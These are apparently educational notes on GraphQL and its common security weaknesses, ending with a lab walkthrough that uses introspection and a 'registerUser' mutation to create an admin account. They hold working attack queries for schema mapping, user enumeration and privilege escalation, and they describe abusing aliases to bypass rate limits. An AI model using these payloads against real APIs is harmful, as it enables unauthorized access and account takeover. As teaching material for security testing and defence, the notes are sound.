



---

# 1. GraphQL API Vulnerabilities

### The Basic Idea

GraphQL APIs often have security holes because of how they're built or configured — not because GraphQL itself is inherently insecure. A common example: **introspection** (a built-in GraphQL feature that lets clients ask the API "what can you do?") is sometimes left turned on in production. This lets attackers map out the entire API schema — every query, field, and type — making it much easier to find something to exploit.

Attackers typically send crafted (malicious) requests to:
- **Steal data** they shouldn't have access to
- **Perform actions** they're not authorized to do (like changing settings or deleting records)

The consequences can be serious — especially if an attacker manages to escalate their privileges to admin level, either by cleverly manipulating queries or by combining the attack with something like CSRF (Cross-Site Request Forgery).

### Example: Introspection Query

If introspection is enabled, an attacker can send a request like this to discover the whole schema:

```graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

This basically asks the API: *"List every data type and field you support."* Once an attacker has this map, they know exactly what queries/mutations exist — including ones that were never meant to be public.

### Example: Malicious Query for Unauthorized Data

Suppose there's a `user` query meant only to return your own profile, but it's not properly restricted:

```graphql
{
  user(id: 1) {
    username
    email
    isAdmin
  }
}
```

If access control isn't enforced properly, an attacker could just loop through `id` values (1, 2, 3, ...) and pull data on *every* user — a form of information disclosure.

### Example: Privilege Escalation via Mutation

```graphql
mutation {
  updateUser(id: 2, isAdmin: true) {
    id
    isAdmin
  }
}
```

If the API doesn't check whether the requester is actually allowed to modify other users, this single request could turn a regular account into an admin.

### In Short

| Issue | Why It's Dangerous |
|---|---|
| Introspection left on | Attackers can see the entire API "blueprint" |
| Weak access control on queries | Attackers can read data belonging to other users |
| Weak access control on mutations | Attackers can change data or escalate privileges |
| Combined with CSRF | Attacker can trick a logged-in admin's browser into making the malicious request for them |

---

## 1.1 - What is GraphQL

GraphQL is a way for a client (like a web or mobile app) to ask a server for exactly the data it needs — no more, no less. Unlike REST APIs, where you often get back a big fixed chunk of data or need to hit several different endpoints, GraphQL lets you request precisely what you want in a single call.

The client doesn't need to know *where* the data actually lives. It just sends a request, and the GraphQL server figures out how to fetch it.

---

## 1.2 - How GraphQL Works

Everything in GraphQL revolves around three types of operations:

| Operation | What it does | REST equivalent |
|---|---|---|
| **Query** | Reads/fetches data | GET |
| **Mutation** | Creates, updates, or deletes data | POST / PUT / DELETE |
| **Subscription** | Keeps a live connection open so the server can push updates in real time | WebSocket-based push |

A key difference from REST: **GraphQL uses just one single endpoint** (usually accessed via POST requests) for *all* operations. There's no `/users`, `/products`, `/orders` — everything goes through the same URL. What determines what happens is the *content* of the request (the operation type and name), not the endpoint or HTTP method.

The server always replies with a JSON object shaped just like what you asked for.

---

## 1.3 - What is a GraphQL schema

The **schema** defines everything the API can do — what data types exist, what fields they have, and how they relate to each other. Think of it as a contract between the client and the server.

Example schema for a "Book" type:

```graphql
type Book {
  id: ID!
  title: String!
  author: String!
  pages: Int
}
```

The `!` symbol means that field is **required** — it can't be empty.

Schemas must also include at least **one** available query. Usually, they also contain details of available mutations.

---

## 1.4 - What are GraphQL queries

A query is how you *read* data. You specify exactly which fields you want back.

```graphql
query getBookDetails {
  book(id: 42) {
    title
    author
  }
}
```

Even if the `Book` type has more fields (like `pages`), you'll only get back `title` and `author` — because that's all you asked for. This selective fetching is one of GraphQL's biggest advantages.

---

## 1.5 - What are GraphQL mutations

Mutations **create**, **update**, or **delete** data. They work like queries but always take some input.

```graphql
mutation {
  addBook(title: "Deep Work", author: "Cal Newport") {
    id
    title
  }
}
```

Response:

```json
{
  "data": {
    "addBook": {
      "id": "101",
      "title": "Deep Work"
    }
  }
}
```

---

## 1.6 - Building Blocks of Queries & Mutations

The GraphQL syntax includes several common components for queries and mutations. (`Fields`, `Arguments`, `Variables`, `Aliases`, `Fragments`)

```
GraphQL Operation (query or mutation)
├── Fields
│   └── Specify which data to return
│       └── Can be nested (e.g., user { id, name, posts { title } })
│
├── Arguments
│   └── Input values for fields
│       └── Inline (e.g., getUser(id: 1))
│       └── Or passed as variables
│
├── Variables
│   └── Externalized input passed with the request
│       ├── Declared in operation signature (e.g., $id: ID!)
│       └── Used in arguments (e.g., getUser(id: $id))
│
├── Aliases
│   └── Rename fields in response
│       └── Useful when querying same field with different args
│       └── Example: user1: getUser(id: 1), user2: getUser(id: 2)
│
└── Fragments
    └── Reusable field selections
        ├── Declared with `fragment`
        └── Included using `...fragmentName`
        └── Helps avoid repetition across multiple fields or types
```

### 1. Fields
The individual pieces of data you request. The response mirrors exactly what you asked for.

The example below shows a query to get ID and name details for all employees, and its associated response. In this case, `id`, `name.firstname`, and `name.lastname` are the fields requested.

```graphql
# Request Example:
query myGetEmployeeQuery {
  getEmployees {
    id
    name {
      firstname
      lastname
    }
  }
}
```

```json
# Response Example:
{
  "data": {
    "getEmployees": [
      {
        "id": 1,
        "name": {
          "firstname": "Carlos",
          "lastname": "Montoya"
        }
      },
      {
        "id": 2,
        "name": {
          "firstname": "Peter",
          "lastname": "Wiener"
        }
      }
    ]
  }
}
```

### 2. Arguments
Values passed to narrow down results — like filtering by an `ID`.

Example, a `getEmployee` request with an employee ID argument returns only that employee's details instead of all employees:

```graphql
# Example query with arguments:

query myGetEmployeeQuery {
    getEmployees(id:1) {
        name {
            firstname
            lastname
        }
    }
}
```

```json
# Response to query:

{
    "data": {
        "getEmployees": [
        {
            "name" {
                "firstname": Carlos,
                "lastname": Montoya
                }
            }
        ]
    }
}
```

⚠️ **Security note:** If an API blindly trusts an argument like `id` to fetch a specific record without checking whether *you're allowed to see it*, that's an **Insecure Direct Object Reference (IDOR)** vulnerability — you could just change the ID and view someone else's data.

### 3. Variables
Instead of hardcoding values into the query text, you can pass them separately from a `JSON` dictionary instead of inline values — useful for reusing the same query structure with different inputs.

To use variables:
- Declare the variable and type
- Add the variable name in the query
- Pass the variable key and value from the dictionary

```graphql
query getBook($id: ID!) {
  book(id: $id) {
    title
  }
}
```
```json
{ "id": 42 }
```

- In this example, the variable is declared in the first line with (`$id: ID!`).
- The `!` indicates that this is a required field for this query. It is then used as an argument in the second line with (`id:$id`).
- Finally, the value of the variable itself is set in the variable `JSON` dictionary.

### 4. Aliases
GraphQL won't let you request the same field twice in one query. For example, the following query is invalid because it tries to return the `product` type twice:
```graphql
# Invalid query:

query getProductDetails {
    getProduct(id: 1) {
        id
        name
    }
    getProduct(id: 2) {
        id
        name
    }
}
```

Aliases work around that by giving each result a custom name — letting you bundle multiple requests into a single call:
```graphql
# Valid query using aliases:

query getProductDetails {
    product1: getProduct(id: "1") {
        id
        name
    }
    product2: getProduct(id: "2") {
        id
        name
    }
}
```

```json
# Response to query:

{
    "data": {
        "product1": {
            "id": 1,
            "name": "Juice Extractor"
         },
        "product2": {
            "id": 2,
            "name": "Fruit Overlays"
        }
    }
}
```

⚠️ **Security note:** Because aliases let you cram multiple operations into one HTTP request, attackers can abuse them to **bypass rate limiting** — e.g., sending 100 login-guess mutations aliased inside a single request instead of 100 separate ones that would normally get throttled.

### 5. Fragments
Reusable chunks of fields you can drop into multiple queries — handy for keeping things DRY (Don't Repeat Yourself).

The example below shows a `getProduct` query in which the details of the product are contained in a `productInfo` fragment.

```graphql
# Example fragment:

fragment productInfo on Product {
    id
    name
    listed
}

# Query calling the fragment:

query {
    getProduct(id: 1) {
        ...productInfo
        stock
    }
}
```

```json
# Response including fragment fields:

{
    "data": {
        "getProduct": {
            "id": 1,
            "name": "Juice Extractor",
            "listed": "no",
            "stock": 5
        }
    }
}
```

---

## 1.7 - Subscriptions: Real-Time Updates

Subscriptions keep a connection open (typically via WebSockets) so the server can push updates to the client the moment something changes — great for chat apps, live dashboards, or collaborative editing tools.

---

## 1.8 - Introspection: The API's Self-Documentation Feature

Introspection lets you *ask the API about itself* — what types, fields, queries, and mutations it supports. It's meant for tools like GraphQL IDEs and auto-generated docs.

```graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

⚠️ **Security note:** This is a big one. If introspection is left enabled in a live production environment, an attacker can use it to map out the *entire* API — including hidden or sensitive fields/mutations that were never meant to be publicly known. Best practice: **disable introspection in production.**

---

## 1.9 - Example Exploitation with Mutations

Usually, we should start with identifying all **mutations** supported by the backend and their arguments. We will use the following introspection query:

```
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

From the result, we can identify a mutation `registerUser`, presumably allowing us to create new users. The mutation requires a `RegisterUserInput` object as an input:

<img width="1127" height="588" alt="image" src="https://github.com/user-attachments/assets/85c29e72-8f34-4017-a80a-ee94c49c2280" />

We can now query all fields of the `RegisterUserInput` object with the following introspection query to obtain all fields that we can use in the mutation:

```
{   
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
```

From the result, we can identify that we can provide the new user's `username`, `password`, `role`, and `msg`:

<img width="1121" height="592" alt="image" src="https://github.com/user-attachments/assets/81984aa7-d742-4f24-990c-d21fa95256e0" />

As we identified earlier, we need to provide the password as an MD5-hash. To hash our password, we can use the following command:

```
$ echo -n 'password' | md5sum

5f4dcc3b5aa765d61d8327deb882cf99  -
```

With the hashed password, we can now finally register a new user by running the mutation:

```
mutation {
  registerUser(input: {username: "vautiaAdmin", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "Hacked!"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

In the result, we can see that the role admin is reflected, which indicates that the attack was successful:

<img width="1133" height="292" alt="image" src="https://github.com/user-attachments/assets/aafb4f57-2d5f-4fa4-8515-c577661d9c06" />

After logging in, we can now access the admin endpoint, meaning we have successfully escalated our privileges:

<img width="1141" height="407" alt="image" src="https://github.com/user-attachments/assets/ca661f00-94e7-4325-b4fa-0f9d8761de88" />

---

### Quick Recap: Where the Risk Comes From

| Feature | What it's for | How it can be abused |
|---|---|---|
| Introspection | Self-documentation | Reveals the entire API structure to attackers |
| Arguments (e.g. IDs) | Fetching specific records | IDOR — accessing other users' data |
| Aliases | Batching multiple operations | Bypassing rate limits (e.g., brute-forcing passwords) |
| Single endpoint + POST | Simplicity | Can make GraphQL requests vulnerable to CSRF if not protected |

---


















































































































